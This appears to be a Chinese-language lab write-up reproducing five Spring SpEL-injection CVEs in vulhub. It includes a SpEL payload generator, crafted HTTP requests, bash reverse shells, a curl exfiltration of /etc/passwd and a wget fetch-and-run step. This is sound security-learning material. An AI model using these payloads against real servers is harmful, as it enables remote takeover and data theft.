>
> 本篇文章是Spring渗透复现记录，记录了实际中常见的Spring漏洞并如何利用，及简单对漏洞底层的原理分析，分为四个部分：Spring简介、IDEA部署Spring、Vulhub靶场环境搭建和相关漏洞复现，在学习Spring中阅读了十几篇中英文相关文章，由浅入深地学习并最终成功复现了5个漏洞，参考的文章也在文中列出。此外，文中也可能会出现部分错误，望读者指出，谢谢。接着，开始我们的Spring渗透之路学习！！

## 一、Spring简介

### 1、Spring及其全家桶简介

Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行管理的轻量级容器（lightweight
container）。Spring可以单独应用于构筑应用程序，也可以和Struts、Webwork、Tapestry等众多Web框架组合使用，并且可以与
Swing等桌面应用程序AP组合。

Spring框架主要由七部分组成，分别是 Spring Core、 Spring AOP、 Spring ORM、 Spring DAO、Spring
Context、 Spring Web和 Spring Web MVC

Spring全家桶包括5个关键部分，Spring framework、 Spring MVC、Spring Boot、 Spring
Cloud、Spring Security。其中Spring就是Spring Framework的缩写，Spring
MVC是Spring中的一个MVC框架，用于开发Web应用和网络接口。Spring
Boot内置Tomcat并且内置默认的XML配置信息，更加便捷。Spring Cloud基于Spring Boot，简化了分布式系统的开发。Spring
Security用于做鉴权，保证安全性。

![gOgUQs.png](https://image.3001.net/images/20210525/1621945902_60acee2e5170b1bf93c43.png!small)

### 2、Spring组件简介

Spring Web Flow是Spring MVC的扩展，它支持开发基于流程的应用程序，可以将流程的定义和实现流程行为的类和视图分离开来。

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。Spring Data
Commons是Spring Data下所有子项目共享的基础框架，Spring Data家族中的所有实现都是基于Spring Data
Commons。简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现，并符合HAL的规范。

Spring
Websocket，Spring内置简单消息代理。这个代理处理来自客户端的订阅请求，将它们存储在内存中，并将消息广播到具有匹配目标的连接客户端。

![gOgdLq.png](https://image.3001.net/images/20210525/1621945906_60acee32a1d72384cb827.png!small)

### 3、SpEL介绍

> 简单理解：表达式语言，执行命令、运算

SpEL(Spring Expression
Language)是一个基于Spring的表达式语言，用于在运行时动态执行一些运算或指令。一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。

SpEL原理

表达式：指传入的字符串内容 解析器：用于将字符串内容解析为表达式内容 上下文：表达式对象执行的环境
根对象和活动上下文对象：根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象

具体的流程如下：

![gOg0e0.png](https://image.3001.net/images/20210525/1621945912_60acee380114e25bf0dd5.png!small)

1.首先给定表达式`1+2`

2.然后给定`SpelExpressionParser`解析器，该解析器就实现了上图中的分析

3.定义上下文对象，这个是可选的，默认是`StandardEvaluationContext`

4.使用表达式对象求值，例如`getValue﻿`

    
    
    参考：  
    http://rui0.cn/archives/1043

### 4、Spring漏洞简介

2009年9月`Spring 3.0 RC1`发布后，`Spring`就引入了`SpEL(Spring Expression
Language)`。对于开发者而言，引入新的工具显然是令人兴奋的，但是对于运维人员，也许是噩耗的开始。类比`Struts2`框架，会发现绝大部分的安全漏洞都和`OGNL`脱不了干系。

### 5、Spring框架特征

1.看Web应用程序的图标

2.看Web的报错页面

3.使用插件wappalyzer

4.看响应头参数X-Application-Context﻿

## 二、本地环境安装

### 1、IDEA下载

下载地址：<https://www.jetbrains.com/idea/download/#section=windows>

选择`Community`社区版即可（白嫖三十天，再重新下）

![gOgayn.png](https://image.3001.net/images/20210525/1621945916_60acee3c75577765f1014.png!small)

### 2、IDEA安装

1）双击安装程序

默认下一步

2）一些选项

如图勾上，默认一直下一步

![gOg5TK.png](https://image.3001.net/images/20210525/1621945921_60acee41d9e283f7dc0e8.png!small)

3）打开x64版本的`IDEA`，选择免费30天

![gOghex.png](https://image.3001.net/images/20210525/1621945926_60acee464eef792b2c8a0.png!small)

选择`continue`

![gOg4w6.png](https://image.3001.net/images/20210525/1621945931_60acee4b5d6421e3c6a1b.png!small)

### 3、IDEA使用及Spring部署

1）创建工程

![gOgWO1.png](https://image.3001.net/images/20210525/1621945938_60acee5245e8ecaf0cb21.png!small)

2）选择下载JDK

![gOgRyR.png](https://image.3001.net/images/20210525/1621945941_60acee55b9cd7c0c0dbc7.png!small)

选择`1.8`版本

![gOgv0P.png](https://image.3001.net/images/20210525/1621945944_60acee588a1a1623e7472.png!small)

3）`Spring Initializr`配置

见图，然后next

![gOgL6A.png](https://image.3001.net/images/20210525/1621945949_60acee5d4e2da6ccd009a.png!small)

4）部署Web模式

![gOgqld.png](https://image.3001.net/images/20210525/1621945953_60acee61cfe296536486a.png!small)

5）等待安装 这部分有点小久

![gOgOOI.png](https://image.3001.net/images/20210525/1621945958_60acee66a04bc66c9f40a.png!small)

6）点击启动 点击右上角启动

![gOgjmt.png](https://image.3001.net/images/20210525/1621945969_60acee7106643ff6d3365.png!small)

7）部署成功

访问地址：`localhost:8080`

![gOgbSH.png](https://image.3001.net/images/20210525/1621945973_60acee757fbc52b3a56c7.png!small)

### 4、漏洞环境搭建

这里使用`vulhub`靶场进行Spring渗透学习

 **0x01 Docker环境安装**

参考：[vulhub漏洞环境搭建](https://blog.csdn.net/qq_36374896/article/details/84102101)

 **1、安装Docker**

    
    
    sudo apt install curl  
    curl -s https://get.docker.com/ | sh

![gPa2sU.png](https://image.3001.net/images/20210525/1621945977_60acee796333c03bf5b5f.png!small)

![gPagMT.png](https://image.3001.net/images/20210525/1621945984_60acee80354a5837b1b69.png!small)

 **2、安装python和pip**

    
    
    sudo apt install python  
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py  
    sudo python get-pip.py

![gPa6zV.png](https://image.3001.net/images/20210525/1621945988_60acee848aba4bff1817b.png!small)

![gPasGq.png](https://image.3001.net/images/20210525/1621945992_60acee88ce17fc23710be.png!small)

 **3、安装`docker-compose`**

    
    
    pip install docker-compose  
    sudo apt install docker-compose  
    docker-compose -v

![gPayR0.png](https://image.3001.net/images/20210525/1621945997_60acee8dc260e2ce7354e.png!small)

![gPaBIs.png](https://image.3001.net/images/20210525/1621946003_60acee932c2908206103e.png!small)

 **0x02 vulhub靶场安装**

    
    
    git clone https://github.com/vulhub/vulhub.git  
    cd vulhub/httpd/CVE-2017-15715/  
    sudo docker-compose build       # 构建  
    sudo docker-compose up -d       # 命令启动容器  
    docker ps                       # 查看正在运行的容器  
    sudo docker exec -it b5975a1a5bfe /bin/bash  # 进入docker容器内

![gPa0aj.png](https://image.3001.net/images/20210525/1621946007_60acee97bfd9d381721aa.png!small)

![gPawZQ.png](https://image.3001.net/images/20210525/1621946014_60acee9e729949d0f6692.png!small)

> 本机IP为192.168.112.141
>
> 参考： [Docker容器进入的4种方式](https://www.cnblogs.com/xhyan/p/6593075.html)

## 三、漏洞复现

> 以复现操作为主，底层原理解析见后续的文章

### 1、Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

 **0x01 漏洞概述**

`Spring Security OAuth2`是为`Spring`框架提供安全认证支持的一个模块。当用户使用`Whitelabel
views`来处理错误时，攻击者可以在被授权的情况下通过构造恶意`SpEL`表达式来远程执行命令。故是在需要知道账号密码的前提下才可以利用该漏洞。

 **影响版本：**

    
    
    Spring Security OAuth 2.0 – 2.0.9  
    Spring Security OAuth 1.0 – 1.0.5

 **0x02 漏洞指纹**

访问下面的`URL`

    
    
    http://192.168.112.141:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test

![gORi4O.png](https://image.3001.net/images/20210525/1621946030_60aceeae6edac27c56993.png!small)

出现下面的返回页面，表示漏洞存在

![gORCE6.png](https://image.3001.net/images/20210525/1621946033_60aceeb1579e422ce11aa.png!small)

 **0x03 漏洞利用**

1）访问搭建好的靶机

![gORPUK.png](https://image.3001.net/images/20210525/1621946037_60aceeb5cbd3af654b85c.png!small)

2）写好POC

这部分用于处理代码

    
    
    #!/usr/bin/env python  
    message = input('Enter message to encode:')  
    poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])  
    for ch in message[1:]:  
    poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)  
    poc += ')}'  
    print(poc)

使用方法：

    
    
    python3 poc1.py
    #输入要执行的代码，会返回处理后的代码
    这里输入whoami
    

![gORVvd.png](https://image.3001.net/images/20210525/1621946040_60aceeb819ab4e21652e5.png!small)

将该代码加入进 **`response_type`** 参数部分，得到`payload`

    
    
    http://192.168.112.141:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&client_id=acme&scope=openid&redirect_uri=http://test
    

3）执行payload

返回了进程，表示代码执行了，但这没有回显，是 **无回显RCE**

![gOREgH.png](https://image.3001.net/images/20210525/1621946043_60aceebbec8d7d5df0113.png!small)

4）无回显XXE结合nc得到回显内容

测试下：

    
    
    Kali Linux：
    	nc -vlp 7766
    靶机上：
    	curl 192.168.112.149:7766 -d "$(cat /etc/passwd)"
    

![gORmDI.png](https://image.3001.net/images/20210525/1621946047_60aceebf88b462939aac0.png!small)

5）payload二次变形

网址：<http://www.jackson-t.ca/runtime-exec-payloads.html>

将下面的代码绕过`exec()`变形

    
    
    bash -i >& /dev/tcp/192.168.112.149/7766 0>&1
    

得到

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDkvNzc2NiAwPiYx}|{base64,-d}|{bash,-i}
    

再放入上面的POC中，得到

![gOReKA.png](https://image.3001.net/images/20210525/1621946051_60aceec37f9ca402236cb.png!small)

    
    
    ${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}
    

修改后的`URL`

    
    
    http://192.168.112.141:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test
    

开启监听，访问上述网址，成功得到shell

![gORtrn.png](https://image.3001.net/images/20210525/1621946056_60aceec8b993f6b525519.png!small)

### 2、Spring Web Flow 远程代码执行漏洞（CVE-2017-4971)

 **0x01 漏洞概述**

Spring Web Flow是一个适用于开发基于流程的应用程序的框架，主要用于解决跨越多个请求的、用户与服务器之间的、有状态交互问题。

当用户使用Spring Web Flow受影响的版本时，如果配置了view-state，但是没有配置相应的binder,并且没有更改useSpringBeanBinding默认的false值，当攻击者构造特殊的http请求时，就可以导致SpEL表达式注入，从而造成远程代码执行漏洞。

 **影响版本：**

    
    
    Spring Web Flow 2.4.0 ~ 2.4.4
    

**触发条件：**

1\. MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）

2\. flow view对象中设置BinderConfiguration对象为空

 **0x02 漏洞指纹**

 **0x03 漏洞利用**

1）进入到付款界面，抓包

![gORYKs.png](https://image.3001.net/images/20210525/1621946060_60aceecc1d22ec43539e1.png!small)

2）修改包数据，发送

    
    
    &_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.112.149/7575 0>%261")).start()=vulhub
    

![gORGvj.png](https://image.3001.net/images/20210525/1621946063_60aceecf70aeabcf0a377.png!small)

#### **0x04 漏洞分析**

    
    
    https://paper.seebug.org/322
    

### 3、Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）

 **0x01 漏洞概述**

Spring Data Rest服务器在处理PATCH请求时存在一个远程代码执行漏洞。攻击者通过构造好的JSON数据来执行任意Java代码。

 **影响版本：**

    
    
    Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
    Spring Boot version < 2.0.0M4
    Spring Data release trains < Kay-RC3
    

**0x02 漏洞指纹**

访问，有如下回显信息则代表有该漏洞

    
    
    http://192.168.112.141:8080/customers/1
    

![gOR1PS.png](https://image.3001.net/images/20210525/1621946067_60aceed3a97ce4c757c65.png!small)

**0x03 漏洞利用**

对http://192.168.112.141:8080/customers/1进行抓包，修改数据，执行的代码被编码为十进制位于new
java.lang.String(new byte[]{xxxxxx})中

十进制编码脚本：

    
    
    python3
    >>> ",".join(map(str, (map(ord,"xxxxxx"))))
    

反弹shell命令：

    
    
    bash -i >& /dev/tcp/192.168.112.149/7733 0>&1
    绕过exec()编码
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDkvNzczMyAwPiYx}|{base64,-d}|{bash,-i}
    

转为十进制，编码后得到：

    
    
    >>> ",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDkvNzczMyAwPiYx}|{base64,-d}|{bash,-i}"))))
    
    98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,105,52,120,78,68,107,118,78,122,99,122,77,121,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125
    

最后构成数据包：

    
    
    PATCH /customers/1 HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json-patch+json
    Content-Length: 202
    
    [
    	{ "op": "replace", 
    	  "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,105,52,120,78,68,107,118,78,122,99,122,77,121,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",
    	  "value": "vulhub" 
    	}
    ]
    

> 注意点：JSON数据部分上面留一行空格

![gOR38g.png](https://image.3001.net/images/20210525/1621946071_60aceed73f9a1d1a2451b.png!small)

####  **0x04 漏洞分析**

    
    
    https://blog.spoock.com/2018/05/22/cve-2017-8046/
    

### 4、Spring Messaging 远程命令执行漏洞（CVE-2018-1270）

 **0x01 漏洞概述**

Spring Messaging为Spring框架提供消息支持

用户使用受影响版本的Spring Framework时，允许应用程序通过Spring
Messaging模块内存中STOMP代理创建WebSocket。由于selector用SpEL表达式编写，并使用StandardEvaluationContext解析(权限太大)，进而导致远程执行代码攻击。

 **影响版本：**

    
    
    Spring Framework 5.0 - 5.0.5
    Spring Framework 4.3 - 4.3.15
    

**0x02 漏洞指纹**

 **0x03 漏洞利用**

1）访问该网址`http://192.168.112.141:8080/gs-guide-websocket`

![gORMUf.png](https://image.3001.net/images/20210525/1621946074_60aceeda5fd7ef544f0e7.png!small)

2）修改`payload`，反弹`shell`

    
    
    bash -i >& /dev/tcp/192.168.112.149/7733 0>&1
    
    java.lang.Runtime.exec()编码后：
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDkvNzczMyAwPiYx}|{base64,-d}|{bash,-i}
    

![gOR82Q.png](https://image.3001.net/images/20210525/1621946079_60aceedf19e77099cde39.png!small)

执行命令

    
    
    python3 exploit.py
    

![gORQ58.png](https://image.3001.net/images/20210525/1621946083_60aceee33647b4e81bc00.png!small)

**0x04 漏洞原理**

    
    
    https://paper.seebug.org/562/
    

### 5、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

 **0x01 漏洞概述**

`Spring
Data`是一个用于简化数据库访问，并支持云服务的开源框架,包含`Commons、Gemfire、JPA、JDBC、MongoDB`等模块。此漏洞产生于`Spring
Data Commons`组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。

`Spring Data
Commons`组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的`SPEL`表达式实现远程代码攻击，直接获取服务器控制权限。

 **影响版本：**

    
    
    Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
    Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
    Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
    Spring Data REST 3.0 - 3.0.5 (Kay SR5)
    

**0x02 漏洞指纹**

 **0x03 漏洞利用**

1）访问http://192.168.112.141:8080/users，抓包

![gORw5T.png](https://image.3001.net/images/20210525/1621946086_60aceee6c5a0287bdbfd8.png!small)

2）修改包数据，尝试获取权限

    
    
    POST /users?page=&size=5 HTTP/1.1
    Host: localhost:8080
    Connection: keep-alive
    Content-Length: 124
    Pragma: no-cache
    Cache-Control: no-cache
    Origin: http://localhost:8080
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://localhost:8080/users?page=0&size=5
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash -i >& /dev/tcp/192.168.112.149/8800 0>&1")]=&password=&repeatedPassword=
    

但是这里一直显示200【未解决】

![gORBPU.png](https://image.3001.net/images/20210525/1621946091_60aceeeb665f62ccf7fce.png!small)

采用另一种`getshell`方法

思路：在公网服务器上写好反弹`shell`命令，传过去，本地执行即可

`shell.sh`文件：

    
    
    bash -i >& /dev/tcp/192.168.112.149/8802 0>&1
    

3）靶机接收该文件 将对应代码放到前面的数据包中，如下图

    
    
    /usr/bin/wget -qO /tmp/1 http://192.168.112.149/shell.sh
    

> -q：不显示指令执行过程
>
> -O：下载并以指定的名字保存

![gORDGF.png](https://image.3001.net/images/20210525/1621946096_60aceef02a1845ec89dad.png!small)

4）靶机执行该文件

将对应代码放到前面的数据包中，如下图，成功`getshell`

    
    
    /bin/bash /tmp/1
    

![gORr24.png](https://image.3001.net/images/20210525/1621946117_60acef056c72a38b604a0.png!small)

**0x04 漏洞原理**

    
    
    http://blog.nsfocus.net/cve-2018-1273-analysis/

